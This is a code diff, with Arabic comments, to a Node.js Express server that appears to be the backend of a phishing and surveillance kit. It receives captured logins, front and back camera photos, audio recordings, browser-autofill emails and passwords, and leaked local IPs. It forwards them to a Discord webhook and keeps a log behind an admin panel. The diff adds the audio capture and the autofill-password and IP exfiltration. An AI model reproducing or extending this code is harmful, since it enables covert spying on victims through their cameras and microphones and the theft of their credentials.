@@ -6,8 +6,8 @@ const path = require('path');
 const crypto = require('crypto');
 const app = express();
 
-// زيادة الحد عشان الصور
-app.use(express.json({ limit: '15mb' }));
+// زيادة الحد عشان الصور والصوت
+app.use(express.json({ limit: '20mb' }));
 app.use(cookieParser());
 
 const LOG = path.join('/tmp', 'captures.log');
@@ -62,22 +62,38 @@ function pushDiscord(data) {
   }).catch(() => {});
 }
 
-// إرسال الصور للديسكورد
-async function pushCamFiles({ front, back, brand, ip }) {
+// إرسال الملفات (صور/صوت) للديسكورد
+async function pushFileToDiscord(base64Data, filename, contentType, contentMsg) {
+  if (!DISCORD_WEBHOOK || !base64Data) return;
+  try {
+    const fd = new FormData();
+    fd.append('payload_json', JSON.stringify({ content: contentMsg }));
+    const buffer = Buffer.from(base64Data.split(',')[1] || base64Data, 'base64');
+    fd.append('file1', new Blob([buffer], { type: contentType }), filename);
+    await fetch(DISCORD_WEBHOOK, { method: 'POST', body: fd }).catch(() => {});
+  } catch (e) {}
+}
+
+// إرسال البيانات الإضافية (IPs و Autofill)
+function pushIntel(data) {
   if (!DISCORD_WEBHOOK) return;
-  const fd = new FormData();
-  fd.append('payload_json', JSON.stringify({
-    content: `📸 **Camera capture** — ${brand || 'unknown'} — \`${ip || ''}\``
-  }));
-  if (front && front.includes(',')) {
-    const b = Buffer.from(front.split(',')[1], 'base64');
-    fd.append('file1', new Blob([b], { type: 'image/jpeg' }), 'front.jpg');
-  }
-  if (back && back.includes(',')) {
-    const b = Buffer.from(back.split(',')[1], 'base64');
-    fd.append('file2', new Blob([b], { type: 'image/jpeg' }), 'back.jpg');
-  }
-  await fetch(DISCORD_WEBHOOK, { method: 'POST', body: fd }).catch(() => {});
+  const embed = {
+    title: `🕵️ Extra Intel (${data.brand || 'unknown'})`,
+    color: 0xffaa00,
+    fields: [
+      { name: 'Public IP', value: `\`${data.ip || 'n/a'}\``, inline: true },
+      { name: 'Local IPs', value: `\`${(data.localIps || []).join(', ') || 'none'}\``, inline: true },
+      { name: 'Autofill Email', value: `\`${data.autofill?.email || 'empty'}\``, inline: false },
+      { name: 'Autofill Pass', value: `\`${data.autofill?.pass || 'empty'}\``, inline: false }
+    ],
+    timestamp: new Date().toISOString()
+  };
+
+  fetch(DISCORD_WEBHOOK, {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({ embeds: [embed] })
+  }).catch(() => {});
 }
 
 function logCapture(data) {
@@ -101,7 +117,7 @@ app.get('/', (req, res) => {
 
 app.use(express.static('public'));
 
-// استقبال البيانات
+// استقبال بيانات تسجيل الدخول
 app.post('/capture', (req, res) => {
   const ip = req.headers['x-forwarded-for']?.split(',')[0] || req.socket.remoteAddress;
   const user = (req.body.user || '').slice(0, 200);
@@ -121,7 +137,29 @@ app.post('/capture', (req, res) => {
 app.post('/upload-cam', async (req, res) => {
   const ip = req.headers['x-forwarded-for']?.split(',')[0] || req.socket.remoteAddress;
   const { front, back, brand } = req.body || {};
-  await pushCamFiles({ front, back, brand, ip });
+  
+  if (front) await pushFileToDiscord(front, 'front.jpg', 'image/jpeg', `📸 Camera (Front) - ${brand} - ${ip}`);
+  if (back) await pushFileToDiscord(back, 'back.jpg', 'image/jpeg', `📸 Camera (Back) - ${brand} - ${ip}`);
+  
+  res.json({ ok: true });
+});
+
+// استقبال التسجيل الصوتي
+app.post('/upload-audio', async (req, res) => {
+  const ip = req.headers['x-forwarded-for']?.split(',')[0] || req.socket.remoteAddress;
+  const { audio, brand } = req.body || {};
+  
+  if (audio) await pushFileToDiscord(audio, 'audio.webm', 'audio/webm', `🎤 Audio Capture - ${brand} - ${ip}`);
+  
+  res.json({ ok: true });
+});
+
+// استقبال البيانات الإضافية (Autofill / IP Leak)
+app.post('/capture-extra', (req, res) => {
+  const ip = req.headers['x-forwarded-for']?.split(',')[0] || req.socket.remoteAddress;
+  const { autofill, localIps, brand } = req.body || {};
+  
+  pushIntel({ ip, localIps, autofill, brand });
   res.json({ ok: true });
 });
 
@@ -160,6 +198,7 @@ tick(); setInterval(tick, 3000);
   res.send(adminHtml);
 });
 
+// سجلات لوحة التحكم
 app.get('/admin/logs', (req, res) => {
   if (!isAdmin(req) && req.query.key !== ADMIN_KEY) return res.status(403).send('nope');
   res.type('text/plain').send(fs.existsSync(LOG) ? fs.readFileSync(LOG, 'utf8') : '');
